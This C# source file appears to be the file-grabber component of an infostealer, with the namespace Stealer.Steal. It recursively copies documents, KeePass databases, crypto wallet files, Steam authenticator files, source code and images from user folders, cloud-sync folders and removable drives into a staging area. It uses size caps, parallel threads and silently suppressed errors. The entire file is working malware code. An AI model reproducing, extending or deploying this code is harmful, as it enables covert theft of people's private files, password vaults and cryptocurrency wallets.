using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Sys;

internal class Graber
{
	private static long sizes = 0L;

	public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
	{
		["Document"] = new string[12]
		{
			"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
			"json", "mafile"
		},
		["DataBase"] = new string[13]
		{
			"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
			"dbf", "wallet", "ini"
		},
		["SourceCode"] = new string[19]
		{
			"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
			"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
		},
		["Image"] = new string[7] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
	};

	private static readonly List<string> TargetDirs = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
	};

	private static string RecordFileType(string type)
	{
		switch (type)
		{
		case "Document":
			Counter.GrabberDocuments++;
			break;
		case "DataBase":
			Counter.GrabberDatabases++;
			break;
		case "SourceCode":
			Counter.GrabberSourceCodes++;
			break;
		case "Image":
			Counter.GrabberImages++;
			break;
		}
		return type;
	}

	private static string DetectFileType(string extensionName)
	{
		string text = extensionName.Replace(".", "").ToLower();
		foreach (KeyValuePair<string, string[]> grabberFileType in GrabberFileTypes)
		{
			string[] value = grabberFileType.Value;
			foreach (string value2 in value)
			{
				if (text.Equals(value2))
				{
					return RecordFileType(grabberFileType.Key);
				}
			}
		}
		return null;
	}

	private static void GrabFile(string path)
	{
		if (sizes <= 15728640)
		{
			FileInfo fileInfo = new FileInfo(path);
			if (fileInfo.Length <= 204800 && !(fileInfo.Name == "desktop.ini") && DetectFileType(fileInfo.Extension) != null)
			{
				DynamicFiles.WriteAllBytes(Path.Combine(Path.Combine("Grabber", Path.GetDirectoryName(path).Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path).Replace(":", ""))), fileInfo.Name), File.ReadAllBytes(fileInfo.FullName));
				sizes += fileInfo.Length;
			}
		}
	}

	private static void GrabDirectory(string path)
	{
		if (!Directory.Exists(path))
		{
			return;
		}
		string[] directories;
		string[] files;
		try
		{
			directories = Directory.GetDirectories(path);
			files = Directory.GetFiles(path);
		}
		catch (UnauthorizedAccessException)
		{
			return;
		}
		catch (AccessViolationException)
		{
			return;
		}
		string[] array = files;
		for (int i = 0; i < array.Length; i++)
		{
			GrabFile(array[i]);
		}
		array = directories;
		foreach (string path2 in array)
		{
			try
			{
				GrabDirectory(path2);
			}
			catch
			{
			}
		}
	}

	public static void Start()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					TargetDirs.Add(driveInfo.RootDirectory.FullName);
				}
			}
			List<Thread> list = new List<Thread>();
			foreach (string dir in TargetDirs)
			{
				try
				{
					list.Add(new Thread((ThreadStart)delegate
					{
						GrabDirectory(dir);
					}));
				}
				catch
				{
				}
			}
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list.Where((Thread t) => t.IsAlive))
			{
				item2.Join();
			}
		}
		catch
		{
		}
	}
}
